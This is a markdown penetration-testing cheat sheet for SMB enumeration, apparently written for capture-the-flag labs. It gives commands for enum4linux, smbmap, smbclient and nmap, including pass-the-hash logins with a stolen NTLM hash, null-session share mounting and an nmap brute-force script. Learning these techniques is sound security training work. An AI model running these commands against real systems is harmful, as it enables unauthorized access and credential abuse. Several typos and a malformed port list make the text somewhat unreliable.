# SMB Scanning
This module contains method sof gathering information from targets that have Samaba, or the Windows sharing service (SMB) enabled.
## Enum4LINUX
[Enum4Linux](https://github.com/portcullislabs/enum4linux) can be used to gather information from a target system via the SMB protocol as so,
```
root@attacker-machine:~# enum4linux (TARGET IP)
```

## NBTScan
[NBTScan](http://www.unixwiz.net/tools/nbtscan.html) can be used to gather information from a target system via the SMB protocol as so,
```
root@attacker-machine:~# nbtscan (TARGET IP ADDRESS)
```

## SMBMap
[SMBMap](https://github.com/ShawnDEvans/smbmap) is ool that can gather information about a remote shared FS via the SMB protocol. The basic syntax for`smbmap` is as follows,
```
root@attacker-machine:~# smbmap -H (TARGET IP ADDRESS)
```
But, if you have access to an NTLM hash, let's use `0B186E661BBDBDFFFFFFFFFFF8B9FD8B` for example, you can append the common Windows NULL string along with a colon, `aad3b435b51404eeaad3b435b51404ee` to it as,
```
aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDFFFFFFFFFFF8B9FD8B
```
and pass along the username, let's say `user123` for example, of the credentials to get more SMB map information like so,
```
root@attacker-machine:~# ./smbmap.py -u user123 -p 'aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDFFFFFFFFFFF8B9FD8B' -H (TARGET IP ADDRESS)
[+] Finding open SMB ports....
[+] Hash detected, using pass-the-hash to authentiate
[+] User session establishd on (TARGET IP ADDRESS)...
[+] IP: (TARGET IP ADDRESS):445	Name: ypuffy.hackthebox.htb                             
	Disk                                                  	Permissions
	----                                                  	-----------
	user123's Files                                    	READ, WRITE
	IPC$                                              	NO ACCESS
'
```
## SMBClient
[SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) very bad software and I believe it's because there are too many variables at stake when trying to successfully use it. Your results may vary, and please do not take any authentication or listing errors as true. Test your enumerated credentials and data using other tools as well. This section describes methods for mounting and listing directories in Samba (LINUX)/Windows shares.

Sometimes, it is required to specify the SMB version number using the `-m smb(n)` argument for the NT service to allow a connection.

### Target information
Attempt to map the share without any credentials (a NULL session)
```
root@attacker-machine:~# smbclient -N -L (TARGET IP) -m SMB2
```
### Mounting shares
To mount a share without knowing any valid users (anonymous/guest login),
```
root@attacker-machine:~# smbclient "\\\\(TARGET IP)\\IPC\$\\" -N -m SMB2
```
To mount a share with an enumerated username,
```
root@attacker-machine:~# smbclient "\\\\(TARGET IP)\\IPC\$\\" -N -U (USER) -m SMB2
```
To mount a share with a username and stolen NTLM hash,
```
root@attacker-machine:~# smbclient --user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\(TARGET IP ADDRESS)\\(TARGET SHARE)\\ (NTLM HASH)
```
e.g.
```
root@attacker-machine:~# smbclient --user=arm554 --pw-nt-hash -m smb3 -L 172.16.0.10 \\\\172.16.0.10\\ 6361DEA164EE8FE91FE7B117FBC9CA5E
```

### File Transfers
To get a file from the target server,
```
smb> get "filename with or without spaces.txt"`
```
## NMAP
The NMAP Scripting Engine (NSE) can be used to brute-force accounts on the server,
```
root@attacker-machine:~# nmap --script smb-brute.nse -p445 (TARGET IP ADDRESS)
```
Another Nmap NSE script tyhat we can try will attempt to gather information on SMB NULL sessions and users as so,
```
root@attacker-machine:~# nmap -p 139.445 --script smb-enum-users (TARGET IP ADDRESS)
